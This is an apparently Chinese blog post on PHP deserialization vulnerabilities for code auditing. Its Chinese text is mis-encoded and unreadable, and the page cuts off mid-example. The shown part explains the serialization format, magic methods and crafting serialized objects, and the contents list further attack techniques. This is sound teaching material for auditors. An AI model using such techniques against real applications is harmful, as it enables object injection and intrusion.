<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>PHPä»£ç å®¡è®¡-ååºåˆ—åŒ–æ¼æ´ | Hao's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=undefined"><link rel="stylesheet" type="text/css" href="https://unpkg.com/normalize.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/pure-min.css"><link rel="stylesheet" type="text/css" href="https://unpkg.com/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="https://unpkg.com/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="https://unpkg.com/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="https://unpkg.com/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="https://unpkg.com/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="https://unpkg.com/toastr/build/toastr.min.css"><div class="darkmode-toggle">ğŸŒ“</div><script>var prefersDarkMode = window.matchMedia('(prefers-color-scheme: dark)');
var toggle = document.querySelector('.darkmode-toggle');
var html = document.querySelector('html');

html.dataset.dark = localStorage.dark || prefersDarkMode.matches;

toggle.addEventListener('click', () => {
localStorage.dark = !(html.dataset.dark == 'true');
html.dataset.dark = localStorage.dark;
});</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">PHPä»£ç å®¡è®¡-ååºåˆ—åŒ–æ¼æ´</h1><a id="logo" href="/.">Hao's Blog</a><p class="description"></p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> é¦–é¡µ</i></a><a href="/archives/"><i class="fa fa-archive"> å½’æ¡£</i></a><a href="/about/"><i class="fa fa-user"> å…³äº</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">PHPä»£ç å®¡è®¡-ååºåˆ—åŒ–æ¼æ´</h1><div class="post-meta">2025-10-12<span> | </span><span class="category"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ä»£ç å®¡è®¡</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">æ–‡ç« ç›®å½•</div><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">PHPååºåˆ—åŒ–æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%EF%BC%8C%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.1.</span> <span class="toc-text">ä¸€ï¼Œåºåˆ—åŒ–çš„æ ¼å¼</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%EF%BC%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">äºŒï¼Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81php7-1-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E7%B1%BB%E5%B1%9E%E6%80%A7%E4%B8%8D%E6%95%8F%E6%84%9F"><span class="toc-number">1.2.1.</span> <span class="toc-text">1ã€php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E7%BB%95%E8%BF%87-wakeup"><span class="toc-number">1.2.2.</span> <span class="toc-text">2ã€ç»•è¿‡__wakeup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E7%BB%95%E8%BF%87%E9%83%A8%E5%88%86%E6%AD%A3%E5%88%99"><span class="toc-number">1.2.3.</span> <span class="toc-text">3ã€ç»•è¿‡éƒ¨åˆ†æ­£åˆ™</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A0%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">åˆ©ç”¨åŠ å·ç»•è¿‡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#serialize-array-a"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">serialize( array( a) );</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%BC%95%E7%94%A8%E4%BD%BF%E4%B8%A4%E5%80%BC%E6%81%92%E7%AD%89"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">åˆ©ç”¨å¼•ç”¨ä½¿ä¸¤å€¼æ’ç­‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">16è¿›åˆ¶ç»•è¿‡å­—ç¬¦è¿‡æ»¤</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="toc-number">1.2.4.</span> <span class="toc-text">4ã€ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E5%8F%98%E5%A4%9A%E9%80%83%E9%80%B8%E6%A1%88%E4%BE%8B"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">ååºåˆ—åŒ–å­—ç¬¦å˜å¤šé€ƒé€¸æ¡ˆä¾‹</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%90%8E%E5%AD%97%E7%AC%A6%E5%8F%98%E5%B0%91"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">è¿‡æ»¤åå­—ç¬¦å˜å°‘</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">ä¸‰ã€å¯¹è±¡æ³¨å…¥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.4.</span> <span class="toc-text">å››ã€pharååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81phar%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.1.</span> <span class="toc-text">1ã€pharæ–‡ä»¶ç»“æ„</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">2ã€åˆ©ç”¨æ–¹æ³•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.5.</span> <span class="toc-text">äº”ã€sessionååºåˆ—åŒ–</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96session%E6%9C%BA%E5%88%B6"><span class="toc-number">1.5.1.</span> <span class="toc-text">1ã€åºåˆ—åŒ–å’Œååºåˆ—åŒ–sessionæœºåˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.5.2.</span> <span class="toc-text">2ã€sessionååºåˆ—åŒ–ç®€å•åˆ©ç”¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text">3ã€åˆ©ç”¨session.upload_progressè¿›è¡Œååºåˆ—åŒ–æ”»å‡»</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><h1 id="PHPååºåˆ—åŒ–æ¼æ´"><a href="#PHPååºåˆ—åŒ–æ¼æ´" class="headerlink" title="PHPååºåˆ—åŒ–æ¼æ´"></a>PHPååºåˆ—åŒ–æ¼æ´</h1><p>åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚php å°†æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¼šç”¨åˆ°ä¸¤ä¸ªå‡½æ•°ï¼šserialize å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸²ï¼›unserialize å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡ã€‚åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èˆ¬ç”¨åšç¼“å­˜ï¼Œæ¯”å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ã€‚</p>
<h2 id="ä¸€ï¼Œåºåˆ—åŒ–çš„æ ¼å¼"><a href="#ä¸€ï¼Œåºåˆ—åŒ–çš„æ ¼å¼" class="headerlink" title="ä¸€ï¼Œåºåˆ—åŒ–çš„æ ¼å¼"></a>ä¸€ï¼Œåºåˆ—åŒ–çš„æ ¼å¼</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">[0] =&gt; xiao</span></span><br><span class="line"><span class="comment">[1] =&gt; shi</span></span><br><span class="line"><span class="comment">[2] =&gt; zi</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span></span><br><span class="line"><span class="comment">a:arrayä»£è¡¨æ˜¯æ•°ç»„ï¼Œåé¢çš„3è¯´æ˜æœ‰ä¸‰ä¸ªå±æ€§</span></span><br><span class="line"><span class="comment">i:ä»£è¡¨æ˜¯æ•´å‹æ•°æ®intï¼Œåé¢çš„0æ˜¯æ•°ç»„ä¸‹æ ‡</span></span><br><span class="line"><span class="comment">s:ä»£è¡¨æ˜¯å­—ç¬¦ä¸²ï¼Œåé¢çš„4æ˜¯å› ä¸ºxiaoé•¿åº¦ä¸º4</span></span><br><span class="line"><span class="comment">ä¾æ¬¡ç±»æ¨</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>åºåˆ—åŒ–åçš„å†…å®¹åªæœ‰æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰æˆå‘˜å‡½æ•°ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">O:4:&quot;test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;xiaoshizi&quot;;s:1:&quot;b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;xiaoshizi&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O : è‡ªå®šä¹‰å¯¹è±¡ <span class="type">object</span></span><br><span class="line"><span class="number">4</span>  : ç±»åçš„é•¿åº¦</span><br><span class="line">:<span class="number">2</span> : 2ä¸ªæˆå‘˜å±æ€§</span><br><span class="line">S:<span class="number">1</span> : <span class="type">a</span>çš„æˆå‘˜å±æ€§å  é•¿åº¦ä¸º<span class="number">1</span> ,å¹¶ä¸”æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²   string</span><br><span class="line">S:<span class="number">9</span> : <span class="type">a</span>æ‰€å¯¹åº”çš„å€¼ æ˜¯stringç±»å‹,å¹¶ä¸”é•¿åº¦æ˜¯<span class="number">9</span>ä½</span><br><span class="line">s:<span class="number">1</span> : <span class="type">b</span>çš„æˆå‘˜å±æ€§å  é•¿åº¦ä¸º<span class="number">1</span> ,å¹¶ä¸”æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²   string</span><br><span class="line">S:<span class="number">9</span> : <span class="type">b</span>æ‰€å¯¹åº”çš„å€¼ æ˜¯stringç±»å‹,å¹¶ä¸”é•¿åº¦æ˜¯<span class="number">8</span>ä½</span><br></pre></td></tr></table></figure>



<p>è€Œå¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\x00*\x00,privateåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\x00ç±»å\x00,è¾“å‡ºæ—¶ä¸€èˆ¬éœ€è¦urlç¼–ç ï¼Œè‹¥åœ¨æœ¬åœ°å­˜å‚¨æ›´æ¨èé‡‡ç”¨base64ç¼–ç çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;xiaoshizi&quot;</span>;<span class="variable language_">$this</span>-&gt;b=<span class="string">&quot;laoshizi&quot;</span>;&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">happy</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;a;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è¾“å‡ºï¼š</span></span><br><span class="line"><span class="comment">O:4:&quot;test&quot;:2:&#123;s:4:&quot; * a&quot;;s:9:&quot;xiaoshizi&quot;;s:7:&quot; test b&quot;;s:8:&quot;laoshizi&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="comment">//è¿™ä¸ª$aæ˜¯ä¸€ä¸ªå—ä¿æŠ¤çš„å±æ€§,ç‰¹å¾å°±æ˜¯\x00*\x00 å·</span></span><br><span class="line">    <span class="comment">//å› ä¸º$bä¸ºç§æœ‰çš„æ‰€ä»¥è¦åœ¨å±æ€§åå‰åŠ ç±»å   &quot; test b&quot;</span></span><br></pre></td></tr></table></figure>

<p>ååºåˆ—åŒ–æ“ä½œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;baobao&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$money</span> = <span class="string">&#x27;199&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;O:4:&quot;test&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;caocao&quot;;s:8:&quot;%00*%00money&quot;;s:3:&quot;199&quot;;s:9:&quot;%00test%00key&quot;;b:0;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$d</span>-&gt;<span class="title function_ invoke__">say</span>();</span><br><span class="line"><span class="comment">//è¾“å‡ºcaocao (åœ¨è°ƒç”¨sayæˆå‘˜æ–¹æ³•æ—¶ï¼Œtestç±»å¿…é¡»å­˜åœ¨)</span></span><br></pre></td></tr></table></figure>



<p><strong>ååºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æœ¯æ–¹æ³•</strong></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__wakeup</span>() <span class="comment">//æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line"><span class="built_in">__sleep</span>() <span class="comment">//æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°</span></span><br><span class="line">__constructï¼šæ„é€ å‡½æ•°,ä¼šåœ¨æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•</span><br><span class="line"><span class="built_in">__destruct</span>() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line"><span class="built_in">__call</span>() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="built_in">__callStatic</span>() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line"><span class="built_in">__get</span>() <span class="comment">//ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•</span></span><br><span class="line"><span class="built_in">__set</span>() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line"><span class="built_in">__isset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line"><span class="built_in">__unset</span>() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line"><span class="built_in">__toString</span>() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line"><span class="built_in">__invoke</span>() <span class="comment">//å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure>

<h2 id="äºŒï¼Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"><a href="#äºŒï¼Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨" class="headerlink" title="äºŒï¼Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨"></a>äºŒï¼Œååºåˆ—åŒ–æ¼æ´åˆ©ç”¨</h2><h3 id="1ã€php7-1-ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ"><a href="#1ã€php7-1-ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ" class="headerlink" title="1ã€php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ"></a>1ã€php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿ</h3><p>å‰é¢è¯´äº†å¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåºåˆ—åŒ–ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\x00*\x00ï¼Œä½†åœ¨ç‰¹å®šç‰ˆæœ¬7.1ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰\x00*\x00ä¹Ÿä¾ç„¶ä¼šè¾“å‡ºabcã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;a = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:3:&quot;abc&quot;;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¾“å‡ºï¼šabc</span></span><br></pre></td></tr></table></figure>

<p>ä¾‹é¢˜ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 